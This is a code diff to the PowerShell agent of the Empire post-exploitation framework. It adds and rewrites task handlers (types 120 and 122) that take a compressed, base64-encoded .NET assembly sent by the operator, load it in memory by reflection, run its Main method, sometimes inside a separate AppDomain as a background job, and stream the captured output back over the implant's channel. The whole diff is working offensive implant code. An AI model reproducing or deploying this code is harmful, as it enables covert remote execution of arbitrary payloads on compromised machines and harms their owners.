@@ -471,14 +471,21 @@ function Invoke-Empire {
     # returns $True if the specified job is completed, $False otherwise
     function Get-AgentJobCompleted {
         param($JobName)
+
         if ($script:tasks.ContainsKey($JobName)) {
             $jobCompleted = $script:tasks[$JobName]['thread'].IsCompleted
+
             if ($jobCompleted) {
-                $script:tasks[$JobName]['status'] = 'completed'
+                if ($script:tasks[$JobName]) {
+                    $script:tasks[$JobName]['status'] = 'completed'
+                } else {
+                    return $false
+                }
             }
             return $jobCompleted
+        } else {
+            return $false
         }
-        return $false
     }
 
     # reads any data from the output buffer preserved for the specified job
@@ -1001,10 +1008,143 @@ function Invoke-Empire {
                 Encode-Packet -data $output -type $type -ResultID $ResultID;
                 $script:tasks[$ResultID]['status'] = 'completed'
             }
+
+            elseif($type -eq 120){
+                try {
+                    $parts = $data.split(",")
+                    $base64String = $parts[1..$parts.length] -join ''
+                    $jsonString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
+                    $jsonObject = $jsonString | ConvertFrom-Json
+
+                    $commandArray = @()
+                    foreach ($keyValue in $jsonObject.PSObject.Properties) {
+                        $commandArray += $keyValue.Value
+                    }
+                    $arguments = @(,[string[]]$commandArray)
+
+                    $bytes = [System.Convert]::FromBase64String($parts[0]);
+                    $ms = New-Object System.IO.MemoryStream
+                    $output = New-Object System.IO.MemoryStream
+                    $ms.Write($bytes, 0, $bytes.Length)
+                    $ms.Seek(0,0) | Out-Null
+
+                    $sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+                    $buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096)
+                    $bytesRead = $sr.Read($buffer, 0, $buffer.length)
+
+                    while ($bytesRead -ne 0) {
+                        $output.Write($buffer, 0, $bytesRead)
+                        $bytesRead = $sr.Read($buffer, 0, $buffer.length)
+                    }
+                    $assemBytes = $output.ToArray()
+
+                    $assembly = [Reflection.Assembly]::Load($assemBytes)
+                    $programType = $assembly.GetType("Program")
+                    $mainMethod = $programType.GetMethod("Main")
+
+                    $streamProp = $programType.GetProperty("OutputStream");
+                    if ($streamProp) {
+                        $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable)
+                        $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle)
+                        $streamReader = [System.IO.StreamReader]::new($pipeServerStream)
+
+                        $ps = [PowerShell]::Create()
+                        $dict = @{
+                            "assembly" = $assembly;
+                            "args"     = $commandArray;
+                            "pipe"     = $pipeClientStream;
+                        }
+
+                        $pipeOutput = New-Object System.IO.StringWriter
+                        $originalConsoleOut = [Console]::Out
+
+                        try {
+                            $task = $ps.AddScript('
+                                [CmdletBinding()]
+                                param(
+                                    [System.Reflection.Assembly]
+                                    $assembly,
+
+                                    [String[]]
+                                    $args,
+
+                                    [IO.Pipes.AnonymousPipeClientStream]
+                                    $pipe
+                                )
+
+                                try {
+                                    $writer = New-Object System.IO.StreamWriter($pipe)
+                                    $writer.AutoFlush = $true
+                                    $writer.WriteLine("ready")
+
+                                    Start-Sleep -Milliseconds 1000
+
+                                    $arguments = @(,[string[]]$args)
+                                    $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
+                                    $streamProp.SetValue($null, $pipe, $null)
+
+                                    $pipeWriter = New-Object System.IO.StreamWriter($pipe)
+                                    $pipeWriter.AutoFlush = $true
+
+                                    [Console]::SetOut($pipeWriter)
+
+                                    $assembly.GetType("Program").GetMethod("Main").Invoke($null, $arguments)
+                                }
+                                finally {
+                                    $pipe.Dispose()
+                                }
+                            ').AddParameters($dict).BeginInvoke()
+
+                            $readyMessage = $streamReader.ReadLine()
+                            if ($readyMessage -eq "ready") {
+                                $buffer = [char[]]::new($pipeServerStream.InBufferSize)
+                                while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
+                                    $pipeOutput.Write($buffer, 0, $read)
+                                    $output = $pipeOutput.ToString().TrimEnd()
+                                    if (-not [string]::IsNullOrWhiteSpace($output)) {
+                                        Encode-Packet -data $output -type 120 -ResultID $ResultID;
+                                    }
+                                }
+                            }
+                        }
+                        finally {
+                            $ps.EndInvoke($task)
+                            [Console]::SetOut($originalConsoleOut)
+                            $pipeOutput.Close()
+                            $script:tasks[$ResultID]['status'] = 'completed';
+                        }
+                    }
+                    else {
+                        $OldConsoleOut = [Console]::Out;
+                        $StringWriter = New-Object IO.StringWriter;
+                        [Console]::SetOut($StringWriter);
+
+                        $null = $mainMethod.Invoke($null, $arguments)
+
+                        [Console]::SetOut($OldConsoleOut)
+                        $result = $StringWriter.ToString()
+                        Encode-Packet -data $result -type 120 -ResultID $ResultID;
+                        $script:tasks[$ResultID]['status'] = 'completed';
+                    }
+                }
+                catch {
+                    Write-Host "Error while executing assembly: $_"
+                    Encode-Packet -type 0 -data "[!] Error while executing assembly: $_" -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'error';
+                }
+            }
+
             elseif ($type -eq 122) {
                 try {
-                    $parts = $data.split(",");
-                    $params = $parts[1..$parts.length];
+                    $parts = $data.split(",")
+                    $base64String = $parts[1..$parts.length] -join ''
+                    $jsonString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
+                    $jsonObject = $jsonString | ConvertFrom-Json
+
+                    $commandArray = @()
+                    foreach ($keyValue in $jsonObject.PSObject.Properties) {
+                        $commandArray += $keyValue.Value
+                    }
                     $bytes = [System.Convert]::FromBase64String($parts[0]);
                     $ms = New-Object System.IO.MemoryStream;
                     $output = New-Object System.IO.MemoryStream;
@@ -1020,68 +1160,124 @@ function Invoke-Empire {
                     }
 
                     $assemBytes = $output.ToArray();
-                    $assem = [Reflection.Assembly]::load($assemBytes);
+                    $assembly = [Reflection.Assembly]::Load($assemBytes)
 
-                    $JobName = "Job_" + [Guid]::NewGuid().ToString();
+                    $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
+                    $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
 
-                    $strmprop = $assem.GetType("Task").GetProperty("OutputStream");
-                    if (!$strmprop) {
-                        # If no OutputStream, directly invoke the Execute method
-                        $Results = $assem.GetType("Task").GetMethod("Execute").Invoke($null, $params);
-                        Set-Variable -Name $JobName -Value $Results -Scope Global;
-                    } else {
-                        # Create unique pipe streams for each task
-                        $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable);
-                        $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle);
-                        $streamReader = [System.IO.StreamReader]::new($pipeServerStream);
+                    $ps = [PowerShell]::Create();
+                    $dict = @{
+                        "assembly" = $assembly;
+                        "args"     = $commandArray;
+                        "pipe"     = $pipeClientStream;
+                    }
 
-                        $dict = @{
-                            "assembly" = $assem;
-                            "params"   = $params;
-                            "pipe"     = $pipeClientStream;
-                            "JobName"  = $JobName;
-                        }
-
-                        $ps = [PowerShell]::Create();
-                        $job = $ps.AddScript('
+                    $task = $ps.AddScript('
                         [CmdletBinding()]
                         param(
-                            [System.Reflection.Assembly] $assembly,
-                            [String[]] $params,
-                            [IO.Pipes.AnonymousPipeClientStream] $Pipe,
-                            [string] $JobName
+                            [System.Reflection.Assembly]
+                            $assembly,
+
+                            [String[]]
+                            $args,
+
+                            [IO.Pipes.AnonymousPipeClientStream]
+                            $pipe
                         )
+
                         try {
-                            $streamProp = $assembly.GetType("Task").GetProperty("OutputStream");
+                            $writer = New-Object System.IO.StreamWriter($pipe)
+                            $writer.AutoFlush = $true
+                            $writer.WriteLine("ready")
+
+                            Start-Sleep -Milliseconds 1000
+
+                            $arguments = @(,[string[]]$args)
+                            $streamProp = $assembly.GetType("Program").GetProperty("OutputStream")
                             if ($streamProp) {
-                                $streamProp.SetValue($null, $Pipe, $null);
+                                $streamProp.SetValue($null, $pipe, $null)
                             }
-                            $result = $assembly.GetType("Task").GetMethod("Execute").Invoke($null, $params);
 
-                            # Store the result in a variable named after JobName
-                            Set-Variable -Name $JobName -Value $result -Scope Global;
+                            $pipeWriter = New-Object System.IO.StreamWriter($pipe)
+                            $pipeWriter.AutoFlush = $true
+                            $originalConsoleOut = [Console]::Out
+                            [Console]::SetOut($pipeWriter)
 
-                        } finally {
-                            $Pipe.Dispose();
+                            $assembly.GetType("Program").GetMethod("Main").Invoke($null, $arguments)
                         }
-                        ').AddParameters($dict).BeginInvoke();
-
-                        $pipeOutput = [Text.StringBuilder]::new();
-                        $buffer = [char[]]::new($pipeServerStream.InBufferSize);
-                        while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
-                            [void]$pipeOutput.Append($buffer, 0, $read);
+                        finally {
+                            $pipe.Dispose()
+                            [Console]::SetOut($originalConsoleOut)
                         }
-                        $ps.EndInvoke($job);
-                        $Results = $pipeOutput.ToString();
+                    ').AddParameters($dict).BeginInvoke()
 
-                        Set-Variable -Name $JobName -Value $Results -Scope Global;
+                    $scriptString = {
+                        param($pipeServerStream, $ps, $task)
+                            try
+                            {
+                                $outputCollector = [Text.StringBuilder]::new()
+                                $streamReader = New-Object System.IO.StreamReader($pipeServerStream)
+                                $readyMessage = $streamReader.ReadLine()
+                                $buffer = [char[]]::new($pipeServerStream.InBufferSize)
+
+                                if ($readyMessage -eq "ready") {
+                                    while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
+                                        $outputChunk = (-join $buffer[0..($read - 1)])
+
+                                        [void]$outputCollector.AppendLine($outputChunk)
+
+                                        $output = $outputCollector.ToString().TrimEnd()
+                                        if (-not [string]::IsNullOrWhiteSpace($output)) {
+                                            $output
+                                        }
+                                        [void]$outputCollector.Clear()
+                                    }
+                                }
+                            }
+                            finally {
+                                $ps.EndInvoke($task)
+                                $script:tasks[$ResultID]['status'] = 'completed';
+                            }
                     }
-                    Encode-Packet -data $Results -type 122 -ResultID $ResultID;
-                    $script:tasks[$ResultID]['status'] = 'completed';
+
+                    $AppDomain = [AppDomain]::CreateDomain($ResultID);
+                    $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
+                    $parameters = @{
+                        "pipeServerStream" = $pipeServerStream;
+                        "ps"               = $ps;
+                        "task"             = $task;
+                    }
+
+                    $null = $PSHost.AddScript($ScriptString).AddParameters($parameters)
+
+                    $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
+                    $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
+                    $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
+                    $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));
+
+                    $Script:tasks[$ResultID] = @{
+                        "result_id" = $ResultID
+                        "packet_type" = $type
+                        "status" = "running"
+                        "thread" = $Job
+                        "language" = $null
+                        "powershell" = @{
+                            "app_domain" = $AppDomain
+                            "ps_host" = $PSHost
+                            "buffer" = $Buffer
+                            "ps_host_exec" = $null
+                        }
+                    }
+
+                    $script:tasks[$ResultID]['status'] = 'running';
+                    $script:ResultIDs[$ResultID] = $ResultID;
+                    Encode-Packet -type $type -data ("Job started: " + $ResultID) -ResultID $ResultID;
                 } catch {
                     $errorMessage = $_.Exception.Message;
                     Encode-Packet -type 0 -data "[!] Error while executing assembly: $errorMessage" -ResultID $ResultID;
-                    $script:tasks[$ResultID]['status'] = 'error';
+                    if ($script:tasks[$ResultID]) {
+                        $script:tasks[$ResultID]['status'] = 'error';
+                    }
                 }
             }
             # return the currently running jobs
@@ -1343,7 +1539,6 @@ function Invoke-Empire {
                 $jobCompleted = Get-AgentJobCompleted -JobName $JobName
                 if ($jobCompleted) {
                     $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
-                    $script:tasks[$JobName]['status'] = 'completed'
                 }
                 else {
                     $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
